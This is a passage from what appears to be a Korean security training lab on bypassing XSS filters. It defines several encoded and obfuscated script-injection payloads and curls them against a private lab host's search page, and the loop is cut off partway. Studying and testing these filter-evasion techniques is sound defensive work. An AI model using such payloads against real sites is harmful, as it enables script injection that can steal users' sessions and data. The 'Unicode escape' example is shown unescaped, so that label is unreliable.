    ■ 실습 방법 (필터 우회 종합)

    ▶ 1단계: 5 카테고리 우회 페이로드
    ```bash
    # 1. 대소문자 혼합 (블랙리스트가 'script' 만 차단 시)
    PAYLOAD1='<ScRiPt>alert(1)</sCrIpT>'

    # 2. HTML 엔티티 인코딩
    PAYLOAD2='&#60;script&#62;alert(1)&#60;/script&#62;'  # &#60; = <
    PAYLOAD3='&lt;svg/onload=alert(1)&gt;'

    # 3. URL 인코딩
    PAYLOAD4='%3Cscript%3Ealert(1)%3C%2Fscript%3E'

    # 4. Unicode escape (브라우저 자동 디코드)
    PAYLOAD5='<script>alert(1)</script>'

    # 5. 이중 인코딩 (WAF 1차 해독 후 통과)
    PAYLOAD6='%253Cscript%253Ealert(1)%253C%252Fscript%253E'

    # 6. JavaScript URI scheme
    PAYLOAD7='<a href="javascript:&#97;lert(1)">click</a>'

    for p in "$PAYLOAD1" "$PAYLOAD4" "$PAYLOAD5" "$PAYLOAD6" "$PAYLOAD7"; do
      echo "=== $p ==="
      curl -s "http://10.20.30.80/#/search?q=$p" | grep -F 'alert' | head -1
